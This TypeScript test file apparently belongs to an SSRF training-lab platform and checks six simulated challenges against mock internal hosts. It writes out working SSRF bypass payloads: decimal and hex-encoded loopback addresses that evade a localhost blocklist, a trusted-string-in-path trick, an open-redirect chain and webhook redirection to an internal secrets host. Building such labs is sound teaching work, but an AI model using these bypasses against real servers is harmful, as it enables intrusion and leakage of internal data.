import { afterAll, beforeAll, describe, expect, it } from "vitest";
import type { CookieClient } from "./helpers.js";
import { startTestApp, type TestApp } from "./helpers.js";
import { expectSolvedOnce, launch } from "./lab-harness.js";

const form = (c: CookieClient, path: string, fields: Record<string, string>) =>
  c.fetch(path, { method: "POST", headers: { "content-type": "application/x-www-form-urlencoded" }, body: new URLSearchParams(fields).toString() });
const text = async (r: Response) => await r.text();

/**
 * SSRF labs never make a real network call (see lab-sdk/mock-internal-net.ts).
 * These tests additionally prove that: every "internal" target here is a
 * simulated host string, never resolved or connected to for real.
 */
describe("ssrf batch 6", () => {
  let t: TestApp;
  beforeAll(async () => {
    t = await startTestApp({ apiPort: 4170, labPortStart: 7500, labPortEnd: 7560 });
  });
  afterAll(async () => {
    await t.manager.stopAll();
    await t.close();
  });

  it("ssrf-logo-fetch: a normal image URL never solves it; the internal host does", async () => {
    const lab = await launch(t, "ssrf-logo-fetch");
    const b = lab.browser();
    const xp0 = await lab.xp();

    const normal = await text(await form(b, "/logo-preview", { url: "https://cdn.invoicehub-assets.test/logo.png" }));
    expect(normal).toContain("fake-image-bytes");
    expect(await lab.solved()).toBe(false);
    const unreachable = await text(await form(b, "/logo-preview", { url: "https://totally-unregistered.test/x" }));
    expect(unreachable).toContain("Could not fetch");
    expect(await lab.solved()).toBe(false);

    const leak = await text(await form(b, "/logo-preview", { url: "http://internal-finance.lab/" }));
    expect(leak).toContain("pendingWireUsd");
    await expectSolvedOnce(lab, "medium", () => form(b, "/logo-preview", { url: "http://internal-finance.lab/" }), xp0);
    await lab.stop();
  });

  it("ssrf-weather-substring-bypass: the real partner and unrelated hosts behave correctly; burying the trusted string in the path bypasses it", async () => {
    const lab = await launch(t, "ssrf-weather-substring-bypass");
    const b = lab.browser();
    const xp0 = await lab.xp();

    expect((await form(b, "/widget-data", { url: "https://api.weather-partner.test/current" })).status).toBe(200);
    expect((await form(b, "/widget-data", { url: "https://totally-unrelated.test/" })).status).toBe(403);
    expect(await lab.solved()).toBe(false);

    const bypass = await form(b, "/widget-data", { url: "http://internal-reports.lab/?trusted=api.weather-partner.test" });
    expect(bypass.status).toBe(200);
    expect(await text(bypass)).toContain("totalUsd");
    await expectSolvedOnce(lab, "medium", () => form(b, "/widget-data", { url: "http://internal-reports.lab/api.weather-partner.test" }), xp0);
    await lab.stop();
  });

  it("ssrf-blocklist-ip-encoding: the obvious spellings are blocked; a decimal-encoded loopback is not", async () => {
    const lab = await launch(t, "ssrf-blocklist-ip-encoding");
    const b = lab.browser();
    const xp0 = await lab.xp();

    for (const blocked of ["http://localhost:9100/", "http://127.0.0.1:9100/", "http://LOCALHOST:9100/"]) {
      expect((await form(b, "/ping", { url: blocked })).status).toBe(403);
    }
    expect((await form(b, "/ping", { url: "http://metrics.partner.test:9100/" })).status).not.toBe(403); // not blocked, just unreachable
    expect(await lab.solved()).toBe(false);

    const decimal = await form(b, "/ping", { url: "http://2130706433:9100/" });
    expect(decimal.status).toBe(200);
    expect(await text(decimal)).toContain("buildTag");
    await expectSolvedOnce(lab, "hard", () => form(b, "/ping", { url: "http://0x7f000001:9100/" }), xp0);
    await lab.stop();
  });

  it("ssrf-webhook-blind-callback: the response never changes and is useless for reading data; the internal counter still proves delivery", async () => {
    const lab = await launch(t, "ssrf-webhook-blind-callback");
    const b = lab.browser();
    const xp0 = await lab.xp();

    const countBefore = (await (await b.fetch("/__debug/ping-count")).json()) as { pingCount: number };
    const resp1 = await text(await form(b, "/check", { url: "https://status.partner.test/" }));
    const resp2 = await text(await form(b, "/check", { url: "http://internal-admin.lab/ping-count" }));
    expect(resp1).toBe(resp2); // truly blind: identical response regardless of target or outcome
    expect(await lab.solved()).toBe(true); // the second request above IS the exploit already
    const countAfter = (await (await b.fetch("/__debug/ping-count")).json()) as { pingCount: number };
    expect(countAfter.pingCount).toBe(countBefore.pingCount + 1);

    await expectSolvedOnce(lab, "hard", () => form(lab.browser(), "/check", { url: "http://internal-admin.lab/ping-count" }), xp0);
    await lab.stop();
  });

  it("ssrf-webhook-destination-abuse: delivering to a real-looking merchant endpoint never solves it; delivering to the internal secrets host does", async () => {
    const lab = await launch(t, "ssrf-webhook-destination-abuse");
    const b = lab.browser();
    const xp0 = await lab.xp();

    expect((await form(b, "/webhooks/configure", { url: "https://merchant-endpoint.test/payhook" })).status).toBe(302);
    const legit = await text(await form(b, "/webhooks/trigger-test", {}));
    expect(legit).toContain("merchant-endpoint.test");
    expect(await lab.solved()).toBe(false);

    await form(b, "/webhooks/configure", { url: "http://internal-secrets.lab/collect" });
    const res = await text(await form(b, "/webhooks/trigger-test", {}));
    expect(res).toContain("internal-secrets.lab");
    await expectSolvedOnce(
      lab,
      "medium",
      async () => {
        await form(b, "/webhooks/configure", { url: "http://internal-secrets.lab/collect" });
        await form(b, "/webhooks/trigger-test", {});
      },
      xp0,
    );
    await lab.stop();
  });

  it("ssrf-linkpreview-redirect: a non-allowlisted host is rejected outright; the real news partner is fine; the redirecting partner leaks the internal host", async () => {
    const lab = await launch(t, "ssrf-linkpreview-redirect");
    const b = lab.browser();
    const xp0 = await lab.xp();

    expect((await form(b, "/preview", { url: "http://not-allowlisted.test/" })).status).toBe(403);
    const direct = await text(await form(b, "/preview", { url: "https://news.partner.test/" }));
    expect(direct).toContain("Synthetic headline");
    expect(await lab.solved()).toBe(false);

    const via = await text(
      await form(b, "/preview", { url: "https://links.partner.test/go?to=" + encodeURIComponent("http://internal-cache.lab/") }),
    );
    expect(via).toContain("cachedSessions");
    expect(via).toContain("internal-cache.lab");
    await expectSolvedOnce(
      lab,
      "hard",
      () => form(lab.browser(), "/preview", { url: "https://links.partner.test/go?to=" + encodeURIComponent("http://internal-cache.lab/") }),
      xp0,
    );
    await lab.stop();
  });
});
